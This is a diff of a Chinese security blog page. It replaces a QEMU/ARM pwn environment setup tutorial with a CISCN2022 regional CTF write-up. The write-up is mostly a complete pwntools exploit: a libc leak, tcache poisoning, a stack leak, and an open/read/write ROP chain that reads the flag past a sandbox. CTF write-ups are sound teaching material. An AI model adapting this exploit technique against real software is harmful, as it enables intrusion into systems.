@@ -16,25 +16,21 @@
   <meta name="author" content="Loora1N">
   <meta name="keywords" content="">
   
-    <meta name="description" content="填坑了，填坑了！学了堆之后很久没有学新东西了，来入门下arm架构下的PWN，为国赛打一点基础。  环境搭建(Ubuntu 20.04)安装QEMU QEMU是一种通用的开源计算机仿真器和虚拟器。QEMU共有两种操作模式全系统仿真：能够在任意支持的架构上为任何机器运行一个完整的操作系统用户模式仿真：能够在任意支持的架构上为另一个Linux&#x2F;BSD运行程序 因此我们可以在linux操作系统">
+    <meta name="description" content="soil3 &amp; mountain1 首先根据unsorted bin 泄露出libc 然后根据libc_base 和 libc.bss()函数泄露栈地址 利用orw ROP覆盖ret返回地址，并绕过沙盒机制 soil3 题目，唯一的区别就是没有沙盒，原mountain题目的EXP即可通过  12345678910111213141516171819202122232425262728293">
 <meta property="og:type" content="article">
-<meta property="og:title" content="QEMU &amp; arm 简易pwn环境搭建">
-<meta property="og:url" content="http://loora1n.github.io/2022/06/05/QEMU%20&%20arm%20%E7%AE%80%E6%98%93pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/index.html">
+<meta property="og:title" content="【CISCN2022】东北赛区分区赛PWN WriteUP">
+<meta property="og:url" content="http://loora1n.github.io/2022/06/21/CISCN%202022/index.html">
 <meta property="og:site_name" content="鷺雨のBlog">
-<meta property="og:description" content="填坑了，填坑了！学了堆之后很久没有学新东西了，来入门下arm架构下的PWN，为国赛打一点基础。  环境搭建(Ubuntu 20.04)安装QEMU QEMU是一种通用的开源计算机仿真器和虚拟器。QEMU共有两种操作模式全系统仿真：能够在任意支持的架构上为任何机器运行一个完整的操作系统用户模式仿真：能够在任意支持的架构上为另一个Linux&#x2F;BSD运行程序 因此我们可以在linux操作系统">
+<meta property="og:description" content="soil3 &amp; mountain1 首先根据unsorted bin 泄露出libc 然后根据libc_base 和 libc.bss()函数泄露栈地址 利用orw ROP覆盖ret返回地址，并绕过沙盒机制 soil3 题目，唯一的区别就是没有沙盒，原mountain题目的EXP即可通过  12345678910111213141516171819202122232425262728293">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://loora1n.github.io/img/article/qemu-arm/qemu.png">
-<meta property="og:image" content="http://loora1n.github.io/img/article/qemu-arm/qemu2.png">
-<meta property="og:image" content="http://loora1n.github.io/img/article/qemu-arm/qemu3.png">
-<meta property="article:published_time" content="2022-06-05T02:57:39.544Z">
-<meta property="article:modified_time" content="2022-06-05T02:57:39.544Z">
+<meta property="article:published_time" content="2022-06-21T06:26:36.825Z">
+<meta property="article:modified_time" content="2022-06-21T06:26:36.825Z">
 <meta property="article:author" content="Loora1N">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://loora1n.github.io/img/article/qemu-arm/qemu.png">
   
   
   
-  <title>QEMU &amp; arm 简易pwn环境搭建 - 鷺雨のBlog</title>
+  <title>【CISCN2022】东北赛区分区赛PWN WriteUP - 鷺雨のBlog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -178,7 +174,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="QEMU &amp; arm 简易pwn环境搭建"></span>
+            <span id="subtitle" data-typed-text="【CISCN2022】东北赛区分区赛PWN WriteUP"></span>
           
         </div>
 
@@ -189,8 +185,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-06-05 10:57" pubdate>
-          2022年6月5日 上午
+        <time datetime="2022-06-21 14:26" pubdate>
+          2022年6月21日 下午
         </time>
       </span>
     
@@ -201,7 +197,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.8k 字
+          3.1k 字
         
       </span>
     
@@ -212,7 +208,7 @@
         
         
         
-          15 分钟
+          27 分钟
         
       </span>
     
@@ -258,41 +254,17 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">QEMU &amp; arm 简易pwn环境搭建</h1>
+            <h1 style="display: none">【CISCN2022】东北赛区分区赛PWN WriteUP</h1>
             
             <div class="markdown-body">
               
-              <blockquote>
-<p>填坑了，填坑了！学了堆之后很久没有学新东西了，来入门下arm架构下的PWN，为国赛打一点基础。</p>
-</blockquote>
-<h2 id="环境搭建-Ubuntu-20-04"><a href="#环境搭建-Ubuntu-20-04" class="headerlink" title="环境搭建(Ubuntu 20.04)"></a>环境搭建(Ubuntu 20.04)</h2><h3 id="安装QEMU"><a href="#安装QEMU" class="headerlink" title="安装QEMU"></a>安装QEMU</h3><blockquote>
-<p>QEMU是一种通用的开源计算机仿真器和虚拟器。QEMU共有两种操作模式<br><strong>全系统仿真</strong>：能够在任意支持的架构上为任何机器运行一个完整的操作系统<br><strong>用户模式仿真</strong>：能够在任意支持的架构上为另一个Linux&#x2F;BSD运行程序 因此我们可以在linux操作系统中安装它，然后用它来调试其它架构平台的程序。</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##首先安装qemu</span><br>sudo apt update<br>sudo apt install qemu<br></code></pre></td></tr></table></figure>
-<p>安装好后可以用tab补全看看是否正确安装。在安装qemu后，对于静态链接的arm程序就已经可以直接运行了，使用命令<code>qemu-arm prog</code>运行32位的arm程序，其中prog指代程序名,对于64位程序使用<code>qemu-aarch64</code>但对于动态链接的程序还是无法正常运行，此时需要安装对应架构的动态链接库才可以正常运行。</p>
-<p><img src="/img/article/qemu-arm/qemu.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
-<h3 id="安装动态链接库"><a href="#安装动态链接库" class="headerlink" title="安装动态链接库"></a>安装动态链接库</h3><p>我们可以使用如下命令来搜索可安装的动态链接库。这里我们以64位为例，安装debug版本的libc</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##搜索libc</span><br>sudo apt search <span class="hljs-string">&quot;libc6&quot;</span> | grep arm<br><span class="hljs-comment">##安装libc</span><br>sudo apt install libc6-dbg-arm64-cross<br></code></pre></td></tr></table></figure>
-
-<p><img src="/img/article/qemu-arm/qemu2.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
-<p>安装完后，在<code>/usr</code>目录下会出现<code>aarch64-linux-gnu</code>这个文件夹，该文件夹即对应刚安装好的arm64位libc库，之后我们使用下面的命令指定arm程序的动态链接器，即可运行程序。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">qemu-aarch64 -g 12345 -L /usr/aarch64-linux-gnu/ ./prog<br><span class="hljs-comment">## -g 代表为程序运行分配的进程端口号，一般用于gdb调试，不填时系统自动分配</span><br><span class="hljs-comment">## -L 代表动态链接库的文件夹地址，静态链接程序可以不需要</span><br></code></pre></td></tr></table></figure>
-<p><code>qemu-arm</code>指的是<strong>arm32架构</strong>，用这个命令来运行32位的arm程序，而<code>qemu-aarch64</code>对应的才是<strong>arm64位架构的程序</strong>，上面两者默认都是小端程序；<code>qemu-armeb</code>用来运行<strong>大端的arm程序</strong>。当然在<strong>上面安装包截图中显示的是arm64，其实和aarch64指的是同一种体系结构，只不过命名略有不同</strong>。</p>
-<h2 id="使用gdb-multiarch进行调试"><a href="#使用gdb-multiarch进行调试" class="headerlink" title="使用gdb-multiarch进行调试"></a>使用gdb-multiarch进行调试</h2><p>首先使用如下命令安装gdb-multiarch</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt update<br>sudo apt install gdb-multiarch<br></code></pre></td></tr></table></figure>
-
-<p>以平台上的ez-arch为例，我们先使用qemu启动程序，并为其分配一个端口</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">qemu-aarch64 -g 12345 -L /usr/aarch64-linux-gnu/ ./stack<br></code></pre></td></tr></table></figure>
-
-<p>使用另外一个终端，打开qemu-multiarch</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌─[loorain@ubuntu] - [~/dest0g3-520/ez-aarch] - [1568]<br>└─[$] sudo gdb-multiarch                                                                             [22:22:12]<br>......<br>......<br>pwndbg&gt; <span class="hljs-built_in">set</span> architecture aarch64<br>The target architecture is assumed to be aarch64<br>pwndbg&gt; target remote localhost:12345<br>Remote debugging using localhost:12345<br>warning: No executable has been specified and target does not support<br>determining executable automatically.  Try using the <span class="hljs-string">&quot;file&quot;</span> <span class="hljs-built_in">command</span>.<br></code></pre></td></tr></table></figure>
-
-<p><img src="/img/article/qemu-arm/qemu3.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
-<p>另外在pwntools中，我们可以使用如下代码来动态调试程序。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">p = process([<span class="hljs-string">&quot;qemu-aarch64&quot;</span>, <span class="hljs-string">&quot;-g&quot;</span>, <span class="hljs-string">&quot;12345&quot;</span>,<span class="hljs-string">&quot;-L&quot;</span>,<span class="hljs-string">&quot;/usr/aarch64-linux-gnu/&quot;</span>, <span class="hljs-string">&quot;./stack&quot;</span>])<br><span class="hljs-comment">##32arm只需要替换指令为qemu-arm，并更换对应的动态链接库</span><br></code></pre></td></tr></table></figure>
-
-<p><strong>注意：不进行调试时不建议使用</strong><code>-p</code><strong>不然可能会导致程序停滞，只能等待gdb链接</strong></p>
-
+              <h2 id="soil3-amp-mountain1"><a href="#soil3-amp-mountain1" class="headerlink" title="soil3 &amp; mountain1"></a>soil3 &amp; mountain1</h2><ul>
+<li>首先根据unsorted bin 泄露出libc</li>
+<li>然后根据libc_base 和 <code>libc.bss()</code>函数泄露栈地址</li>
+<li>利用orw ROP覆盖ret返回地址，并绕过沙盒机制</li>
+<li>soil3 题目，唯一的区别就是没有沙盒，原mountain题目的EXP即可通过</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs PYTHON"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment"># io = remote(&#x27;172.16.30.186&#x27;,58012)</span><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Choice:&#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Please input size:&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(size))<br>    io.recvuntil(<span class="hljs-string">&#x27;Please input content:&#x27;</span>)<br>    io.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Choice:&#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Please input idx:&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Choice:&#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Please input idx:&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Choice:&#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Please input idx:&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br>    <span class="hljs-keyword">if</span> idx&lt;=<span class="hljs-number">32</span>:<br>        io.recvuntil(<span class="hljs-string">&#x27;Please input content:&#x27;</span>)<br>        io.send(content)<br><br><br>add(<span class="hljs-number">0x430</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x430</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># pause()</span><br>show(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># io.recvline()</span><br><span class="hljs-comment"># pause()</span><br>libc_base = u64(io.recvuntil(<span class="hljs-string">&#x27;Done&#x27;</span>)[<span class="hljs-number">1</span>:-<span class="hljs-number">4</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - libc.symbols[<span class="hljs-string">&#x27;main_arena&#x27;</span>] - <span class="hljs-number">96</span><br>success(<span class="hljs-string">&#x27;libc_base --&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>bss_addr = libc_base + libc.bss()<br>success(<span class="hljs-string">&#x27;bss --&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(bss_addr))<br>flag_addr = bss_addr + <span class="hljs-number">0x200</span><br><span class="hljs-comment"># edit(32,&#x27;&#x27;)</span><br><br>pop_rdi = libc_base +<span class="hljs-number">0x000000000002daa2</span> <span class="hljs-comment">#: pop rdi ; ret</span><br>pop_rsi = libc_base + <span class="hljs-number">0x0000000000037bfa</span><span class="hljs-comment"># : pop rsi ; ret</span><br>pop_rdx = libc_base + <span class="hljs-number">0x0000000000106791</span><span class="hljs-comment"># : pop rdx ; pop r12 ; ret</span><br>pop_rax = libc_base + <span class="hljs-number">0x00000000000446b0</span><span class="hljs-comment"># : pop rax ; ret</span><br>open_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br><br><br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>key = u64(io.recvuntil(<span class="hljs-string">&#x27;Done&#x27;</span>)[<span class="hljs-number">1</span>:-<span class="hljs-number">4</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">&#x27;key--&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(key))<br><span class="hljs-comment"># pause()</span><br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0x40</span>)<br><span class="hljs-comment"># pause()</span><br>free(<span class="hljs-number">0</span>)<br><br>edit(<span class="hljs-number">0</span>,p64((bss_addr-<span class="hljs-number">0x10</span>)^key))<br><span class="hljs-comment"># pause()</span><br>add(<span class="hljs-number">0x400</span>,p64((bss_addr-<span class="hljs-number">0x10</span>)^key))<br><span class="hljs-comment"># pause()</span><br><br>add(<span class="hljs-number">0x400</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br><br><span class="hljs-comment"># pause()</span><br>show(<span class="hljs-number">4</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>stack = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>ret = stack-<span class="hljs-number">0x148</span><br>success(<span class="hljs-string">&#x27;stack_addr --&gt;&#x27;</span> +<span class="hljs-built_in">hex</span>(stack-<span class="hljs-number">0x8</span>))<br>success(<span class="hljs-string">&#x27;ret--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(ret))<br><span class="hljs-comment"># free(1)</span><br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>free(<span class="hljs-number">5</span>)<br>edit(<span class="hljs-number">5</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span>)<br>free(<span class="hljs-number">5</span>)<br>edit(<span class="hljs-number">5</span>,p64((ret)^key))<br><span class="hljs-comment"># pause()</span><br>add(<span class="hljs-number">0x400</span>,p64((ret)^key))<br>pause()<br>orw = <span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span><br>orw += p64(pop_rdi)<br>orw += p64(ret)<br>orw += p64(pop_rsi)<br>orw += p64(<span class="hljs-number">0</span>)<br>orw += p64(pop_rdx)<br>orw += p64(<span class="hljs-number">0</span>)<br>orw += p64(<span class="hljs-number">0</span>)<br>orw += p64(open_addr)<br><br><br><span class="hljs-comment">##read</span><br>orw += p64(pop_rdi)<br>orw += p64(<span class="hljs-number">3</span>)<br>orw += p64(pop_rsi)<br>orw += p64(flag_addr)<br>orw += p64(pop_rdx)<br>orw += p64(<span class="hljs-number">0x100</span>)<br>orw += p64(<span class="hljs-number">0</span>)<br>orw += p64(read_addr)<br><br><span class="hljs-comment">##write</span><br>orw += p64(pop_rdi)<br>orw += p64(<span class="hljs-number">1</span>)<br>orw += p64(pop_rsi)<br>orw += p64(flag_addr)<br>orw += p64(pop_rdx)<br>orw += p64(<span class="hljs-number">0x100</span>)<br>orw += p64(<span class="hljs-number">0</span>)<br>orw += p64(write_addr)<br>add(<span class="hljs-number">0x400</span>,orw)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
               
             </div>
             <hr/>
@@ -308,8 +280,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>QEMU &amp; arm 简易pwn环境搭建</div>
-      <div>http://loora1n.github.io/2022/06/05/QEMU &amp; arm 简易pwn环境搭建/</div>
+      <div>【CISCN2022】东北赛区分区赛PWN WriteUP</div>
+      <div>http://loora1n.github.io/2022/06/21/CISCN 2022/</div>
     </div>
     <div class="license-meta">
       
@@ -321,7 +293,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年6月5日</div>
+          <div>2022年6月21日</div>
         </div>
       
       
@@ -351,18 +323,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/06/05/%E3%80%8A%E6%A0%BC%E8%B0%83%EF%BC%9A%E7%A4%BE%E4%BC%9A%E7%AD%89%E7%BA%A7%E4%B8%8E%E7%94%9F%E6%B4%BB%E5%93%81%E5%91%B3%E3%80%8B/" title="我的必读书目表(仍在更新)">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">我的必读书目表(仍在更新)</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/06/04/ciscn2022/" title="【CISCN2022】初赛PWN部分writeup">
-                        <span class="hidden-mobile">【CISCN2022】初赛PWN部分writeup</span>
+                      <a href="/2022/06/08/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E4%BA%94%E7%A7%8D%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/" title="分组密码的五种工作模式">
+                        <span class="hidden-mobile">分组密码的五种工作模式</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
